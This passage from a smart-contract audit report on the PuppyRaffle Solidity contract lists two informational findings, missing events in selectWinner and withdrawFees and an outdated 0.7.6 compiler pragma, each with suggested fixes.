-       "PuppyRaffle: There are currently players active!"
-   );
+   require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```



# Info Risk Findings

## [I-1]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees

## Description
Several critical state changes occur without emitting corresponding events, which hinders off-chain monitoring and transparency. Specifically:
1. In `selectWinner`, when a winner is chosen and paid, no event is emitted.
2. In `withdrawFees`, when the owner withdraws accumulated fees, no event is emitted.

## Impact
The lack of events makes it difficult for users, developers, and monitoring tools to track important activities on the contract. This reduces transparency and makes it harder to build reliable off-chain applications that interact with the raffle.

## Proof of Concept
1. Call `selectWinner`. Observe that no event like `WinnerSelected` is present in the transaction receipt.
2. Call `withdrawFees`. Observe that no event like `FeesWithdrawn` is present in the transaction receipt.

## Proof of Code
```solidity
// This is an observability issue. A test would involve checking the transaction logs
// (via `vm.getRecordedLogs()`) and asserting that expected logs are missing.
// The proof is the absence of `emit` statements in the source code.

// In PuppyRaffle.sol -> selectWinner():
// ...
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
// No event emitted here.

// In PuppyRaffle.sol -> withdrawFees():
// ...
(bool success, ) = feeAddress.call{value: feesToWithdraw}("");
require(success, "PuppyRaffle: Failed to withdraw fees");
// No event emitted here.
```

## Suggested Mitigation
Define and emit events for all significant state changes to improve observability.

```solidity
// Add event declarations to the contract
event WinnerSelected(address indexed winner, uint256 indexed tokenId, uint256 prizeAmount);
event FeesWithdrawn(address indexed feeAddress, uint256 amount);

// In selectWinner()
// ...
_safeMint(winner, tokenId);
emit WinnerSelected(winner, tokenId, prizePool);

// In withdrawFees()
// ...
require(success, "PuppyRaffle: Failed to withdraw fees");
emit FeesWithdrawn(feeAddress, feesToWithdraw);
```

## [I-2]. Pragma issue in PuppyRaffle::NA

## Description
The contract is deployed using `pragma solidity 0.7.6;`. While locking pragmas is good practice, this is an older version of the compiler that predates the introduction of default overflow/underflow checks in Solidity 0.8.0. Using older versions exposes the contract to a class of bugs that are now mitigated by default in the compiler, and may also contain other known but unfixed bugs.

## Impact
The contract is more susceptible to integer arithmetic bugs, as demonstrated by the multiple overflow vulnerabilities found. It also misses out on other security improvements and optimizations available in newer compiler versions.

## Proof of Concept
The vulnerability is the use of an outdated pragma version, as seen on the first line of the contract source code: `pragma solidity 0.7.6;`.

## Proof of Code
```solidity
// The proof is the pragma statement in PuppyRaffle.sol
// pragma solidity 0.7.6;
```

## Suggested Mitigation
It is highly recommended to upgrade the contract to a more recent and stable Solidity version, such as `0.8.20` or later. This provides automatic protection against arithmetic overflows and underflows and includes other security enhancements. After upgrading, `SafeMath` is no longer necessary.

```solidity
// Change this:
// pragma solidity 0.7.6;

// To this:
pragma solidity ^0.8.20;
```



